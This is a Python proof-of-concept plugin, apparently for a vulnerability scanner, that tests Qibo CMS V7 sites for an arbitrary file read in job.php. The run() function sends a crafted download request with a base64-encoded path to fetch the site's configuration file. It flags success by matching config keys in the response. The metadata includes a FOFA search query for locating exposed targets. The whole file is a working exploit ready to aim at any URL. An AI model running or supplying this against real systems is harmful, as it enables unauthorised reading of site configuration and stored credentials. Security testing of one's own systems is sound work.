#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/cms/齐博CMS/齐博CMS V7 job.php 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '齐博CMS V7 job.php 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="齐博软件-v7"',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'webdb.*?flashtime.*?CommentTime.*?QQ_login.*?groupPassContribute.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret